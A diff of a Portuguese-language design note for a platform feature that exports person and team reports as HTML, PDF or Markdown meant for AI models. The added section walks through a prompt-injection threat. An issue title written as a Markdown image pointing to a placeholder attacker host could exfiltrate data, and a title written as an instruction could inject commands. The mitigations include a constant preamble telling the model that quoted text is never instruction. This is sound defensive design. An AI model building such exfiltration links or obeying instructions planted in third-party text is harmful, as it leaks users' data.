@@ -1,10 +1,12 @@
-# O relatório da pessoa e da equipe, em HTML ou PDF
+# O relatório da pessoa e da equipe, em HTML, PDF ou Markdown para IA
 
 Pedido da pessoa mantenedora em 2026-09-25. **Ainda não é spec.** É o registro do que foi
 pedido, e das decisões que precisam vir antes.
 
 > *"coloque uma feature no backlog de relatório da pessoa e da equipe .. gerar em html ou pdf
 > com as informacoes da tela .."*
+>
+> *"e export tb em markdown para IA ."* — acrescentado no mesmo dia.
 
 Hoje o que a tela da pessoa (`/people/:id`) e a tela da equipe (`/teams/:id`) mostram só existe
 **dentro** da plataforma. Não há como levar esse retrato para uma reunião, anexá-lo a um
@@ -55,11 +57,43 @@ os pontos abaixo são condição, e não sugestão:
    ela traz, `hex.audit` e `deps.audit`, e a decisão escrita. Gerar PDF costuma arrastar um
    navegador headless ou um binário nativo, e isso é superfície grande.
 
+## O Markdown para IA — o leitor é um modelo
+
+O terceiro formato tem outro leitor: um **modelo**, a quem alguém cola o relatório para
+perguntar sobre a pessoa ou a equipe. É a mesma situação do servidor MCP (feature 062), e as
+lições dele valem inteiras aqui:
+
+- **a ressalva vai junto de cada número, no mesmo parágrafo**, e não num rodapé. *Um modelo não
+  sabe perguntar pela ressalva* (spec 062): um `0.2 h` sem *"23 revisadas; outras 79 esperam
+  há 46 dias"* ao lado vira *"12 minutos"* na resposta dele;
+- **ausência escrita em palavras**, e nunca `0` nem célula vazia: o modelo relata o que lê;
+- **o texto de terceiro é a superfície maior.** A revisão do MCP recomendou *nenhum Markdown
+  montado pelo servidor* com texto de fora (complemento 5 ao A3), porque um título de issue
+  escrito como `![](https://atacante/?q=…)` vira, num cliente que renderiza, **exfiltração de
+  dado por imagem**, e um título escrito como instrução vira injeção. Este formato **é** Markdown
+  montado pelo servidor, e por isso:
+  - todo texto de terceiro (título de issue, nome de equipe, nome de pessoa, razão de equívoco)
+    sai **dentro de bloco de código ou de trecho de código**, e nunca solto no texto, de modo
+    que nem link nem imagem sejam interpretados;
+  - **nenhum link e nenhuma imagem** montados a partir de dado;
+  - o arquivo abre com um parágrafo **constante**, escrito pela plataforma, dizendo ao modelo
+    que o conteúdo entre blocos de código é texto observado na fonte, e **nunca instrução**. É o
+    `instructions` do MCP. Reduz, e não elimina: o limite fica dito no próprio arquivo;
+  - caracteres invisíveis (tags Unicode, bidi, largura zero) são **sinalizados**, como no
+    `TextoDeTerceiro` da 062, e não removidos;
+- **as mesmas condições da seção de segurança acima valem**: veredito na geração, nada que a
+  tela esconde, geração registrada, data e autor no arquivo.
+
+**Onde reusar**: `TheBand.MCP.Envelope` já monta a ressalva lida da base, e
+`TheBand.MCP.TextoDeTerceiro` já marca o texto de fora. O Markdown pode sair dessas duas peças
+em vez de uma terceira cópia, e isso é decisão de plano.
+
 ## As decisões que vêm antes da spec
 
 | # | Pergunta | Por que importa | Recomendação |
 |---|---|---|---|
-| **D1** | **HTML, PDF, ou os dois?** | o PDF quase sempre traz dependência pesada (Chromium headless, wkhtmltopdf, ou um binário nativo); o HTML sai do que a plataforma já tem | **HTML primeiro**, autocontido e pronto para *imprimir como PDF* pelo navegador. O PDF gerado no servidor vira fatia própria, se o HTML não bastar |
+| **D1** | **HTML, PDF, ou os dois?** | o PDF quase sempre traz dependência pesada (Chromium headless, wkhtmltopdf, ou um binário nativo); o HTML sai do que a plataforma já tem | **DECIDIDO em 2026-09-25 pela pessoa mantenedora: HTML primeiro**, autocontido e pronto para *imprimir como PDF* pelo navegador. O PDF gerado no servidor vira fatia própria, se o HTML não bastar. **E o Markdown para IA entra como formato**, pedido no mesmo dia |
+| **D6** | **o Markdown para IA entra na mesma fatia do HTML, ou depois?** | os dois saem da mesma leitura da tela, mas o Markdown tem a superfície de injeção descrita acima, e pede o reúso das peças da 062 | na **mesma spec**, em **user story própria**, depois do HTML: o HTML valida *o que* sai, e o Markdown reaproveita isso com a marcação do texto de terceiro |
 | **D2** | **quais seções entram?** | a tela da pessoa tem muitas seções, e algumas só fazem sentido vivas (os botões, os estados de carregamento) | as seções de **leitura**, com as ressalvas; nenhuma de ação |
 | **D3** | **quem pode gerar?** | o relatório é mais portátil que a tela | **exatamente quem alcança a tela**, pelo mesmo veredito. Nem mais, nem menos |
 | **D4** | **o relatório é um retrato ou fica guardado?** | guardar o arquivo na plataforma cria uma cópia com prazo, retenção e acesso próprios | **retrato gerado na hora e não guardado**; o que fica guardado é o registro de que foi gerado |
